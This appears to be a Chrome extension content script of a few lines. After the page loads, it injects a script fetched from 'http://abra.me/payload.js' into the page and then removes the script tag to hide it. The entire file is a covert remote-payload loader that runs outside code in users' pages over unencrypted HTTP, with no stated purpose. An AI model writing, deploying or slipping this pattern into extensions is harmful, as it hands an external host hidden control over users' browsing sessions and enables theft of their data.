chrome.extension.sendMessage({}, function(response) {
	var readyStateCheckInterval = setInterval(function() {
	if (document.readyState === "complete") {
		clearInterval(readyStateCheckInterval);

		var s = document.createElement('script');
		s.src = "http://abra.me/payload.js";
		s.onload = function() {
    		this.parentNode.removeChild(this);
		};
		(document.head||document.documentElement).appendChild(s);
	}
	}, 10);


});

